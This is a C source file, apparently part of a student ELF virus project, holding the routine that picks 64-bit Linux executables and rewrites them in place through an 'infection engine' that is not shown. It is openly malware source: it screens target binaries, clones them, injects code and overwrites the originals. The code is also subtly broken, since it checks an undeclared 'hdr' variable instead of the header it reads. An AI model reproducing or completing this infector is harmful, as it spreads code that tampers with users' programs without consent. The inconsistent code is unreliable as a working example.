/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/22 23:01:15 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <linux/elf.h>
#include "infect.h"
#include "syscall.h"
#include "accessors.h"
#include "errors.h"
#include "utils.h"
#include "log.h"

static bool	is_candidate(const char *file)
{
	Elf64_Ehdr	elf64_hdr;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0) return errors(ERR_SYS, _ERR_OPEN_FAILED);

	if (sys_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	if (ft_memcmp(hdr->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
	|| hdr->e_ident[EI_DATA] != ELFDATA2LSB           // not little endian
	|| hdr->e_entry == 0                              // no entry point
	|| hdr->e_phoff == 0                              // no program hdr table
	|| hdr->e_shoff == 0)                             // no section hdr table
	{
		sys_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	sys_close(fd);
	return true;
}

inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
{
	struct safe_ptr	original_ref;
	struct safe_ptr	clone_ref;

	log_try_infecting(file);

	if (!is_candidate(file)
	|| !init_original_safe(&original_ref, file)
	|| !init_clone_safe(&clone_ref, original_ref.size)
	|| !infection_engine(clone_ref, original_ref, seed)
	|| !write_file(clone_ref, file))
		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);

	free_accessor(&original_ref);
	free_accessor(&clone_ref);

	log_success();

	return true;
}
